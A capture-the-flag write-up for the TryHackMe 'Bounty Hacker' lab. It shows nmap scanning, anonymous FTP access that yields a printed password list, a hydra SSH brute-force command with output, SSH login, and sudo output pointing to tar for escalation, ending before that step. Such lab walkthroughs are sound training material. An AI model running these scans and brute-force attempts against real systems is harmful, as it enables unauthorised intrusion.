# THM: Bounty Hacker

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="../../images/write_ups/try_hack_me/bounty_hacker/bounty_hacker.jpeg" alt="Bounty Hacker" width="90"/> |
| Room | Bounty Hacker |
| URL | https://tryhackme.com/room/cowboyhacker |
| Difficulty | Easy |

## Concepts/Tools Used

- [ftp](../../tools/ftp.md)
- [hydra](../../tools/hydra.md)

## Room Description

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-18 18:44 BST
Nmap scan report for target.thm (10.10.32.110)
Host is up (0.00023s latency).
Not shown: 55529 filtered ports, 10003 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.54.180
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:A9:BD:3A:F3:53 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.13 seconds
```

## Who wrote the task list?

The output lets me know that the ftp server allows anonymous logins. That is where I will start. I log into the ftp server with the command:

```bash
$ ftp target.thm
Connected to target.thm.
220 (vsFTPd 3.0.3)
Name (target.thm:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Now that I am on the ftp server I will take a look and see what files are available with the following command:

```bash
ftp> ls -lha
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

There are two files. I'll output each of them to see their contents. Here is the output of locks.txt:

```bash
ftp> get locks.txt -
remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
226 Transfer complete.
418 bytes received in 0.05 secs (8.6003 kB/s)
```

Here are the contents of task.txt:

```bash
ftp> get task.txt -
remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-REDACTED
226 Transfer complete.
68 bytes received in 0.00 secs (327.1244 kB/s)
```

The output of task.txt tells me the user that wrote the file. I note this as a possible username for future tasks. The locks.txt file seems to be a password list.

I download the locks.txt file to my attack box and call it passwords.txt. The command I ran is the following:

```bash
ftp> get locks.txt passwords.txt
local: passwords.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.00 secs (6.0399 MB/s)
```

I exit out of ftp by typing the following:

```bash
ftp> quit
221 Goodbye.
```

I don't have any other files on the ftp server so I'll move on.

## What service can you brute force with the text file found and what is the users password?

From here, I only have the ssh and http services on the machine to check. Since I got a username and a wordlist, I'll try to brute force ssh.

I am going to use hydra to try brute forcing the password of the username I found in task.txt. Here is the command that I used:

```bash
hydra -l REDACTED -P passwords.txt target.thm ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-18 19:00:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://target.thm:22/
[22][ssh] host: target.thm   login: REDACTED   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-18 19:00:18
```

It turns out that we can brute force the ssh service and hydra has given me the password.

## Getting a Foothold

I ssh into the box user the username and password provided by hydra. Here is the command:

```bash
$ ssh REDACTED@target.thm
```

I have a shell. I'm in!

## Privilege Escalation

I ran my [usual list of commands](../../README.md#linux-privilege-escalation). Running sudo -l did yield some interesting results:

```bash
sudo -l
[sudo] password for REDACTED: 
Matching Defaults entries for REDACTED on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User REDACTED may run the following commands on bountyhacker:
    (root) /bin/tar
```
